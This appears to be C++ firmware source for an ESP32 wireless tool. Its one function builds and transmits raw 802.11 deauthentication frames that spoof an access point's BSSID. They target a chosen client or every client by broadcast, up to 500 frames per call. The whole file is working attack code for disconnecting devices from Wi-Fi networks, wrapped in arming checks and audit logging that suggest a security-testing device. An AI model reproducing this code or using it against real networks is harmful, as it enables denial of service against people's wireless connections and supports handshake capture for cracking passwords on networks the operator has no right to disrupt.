#include "deauth.h"
#include "tx_arm.h"
#include "mac_utils.h"
#include "input_validator.h"
#include "audit_log.h"
#include <esp_wifi.h>

namespace Deauth {

bool send(const String &bssidStr, const String &clientStr, uint8_t channel, uint16_t frames) {
    if (!TxArm::isArmed()) {
        AUDIT_LOG(AuditEventType::TOOL_FAILURE, "Deauth", "TX not armed");
        return false;
    }

    // Validate channel
    if (InputValidator::validateChannel(channel) != ErrorCode::SUCCESS) {
        char details[64];
        snprintf(details, sizeof(details), "Invalid channel: %d", channel);
        AUDIT_LOG(AuditEventType::ERROR_OCCURRED, "Deauth", details);
        return false;
    }

    // Validate frames count (reasonable limits)
    if (frames == 0 || frames > 500) {
        char details[64];
        snprintf(details, sizeof(details), "Invalid frame count: %d", frames);
        AUDIT_LOG(AuditEventType::ERROR_OCCURRED, "Deauth", details);
        return false;
    }

    uint8_t bssid[6], client[6];
    if (!MacUtils::parse(bssidStr.c_str(), bssid)) {
        AUDIT_LOG(AuditEventType::ERROR_OCCURRED, "Deauth", "Invalid BSSID format");
        return false;
    }
    if (clientStr.length() == 0 || !MacUtils::parse(clientStr.c_str(), client)) {
        memcpy(client, MacUtils::BROADCAST, 6);
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t frame[26] = {
        0xC0, 0x00,       // frame control: deauthentication
        0x00, 0x00,       // duration
        0, 0, 0, 0, 0, 0, // addr1: destination (client, or broadcast)
        0, 0, 0, 0, 0, 0, // addr2: source (bssid)
        0, 0, 0, 0, 0, 0, // addr3: bssid
        0x00, 0x00,       // seq-ctl
        0x01, 0x00        // reason code: unspecified
    };
    memcpy(frame + 4, client, 6);
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);

    char logDetails[96];
    snprintf(logDetails, sizeof(logDetails), "BSSID=%s,channel=%d,frames=%d",
             bssidStr.c_str(), channel, frames);
    AuditLog::instance().log(AuditEventType::TOOL_START, "Deauth", logDetails);

    for (uint16_t i = 0; i < frames; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        delay(2);
    }

    AuditLog::instance().log(AuditEventType::TOOL_SUCCESS, "Deauth", "Frames transmitted");
    return true;
}

} // namespace Deauth
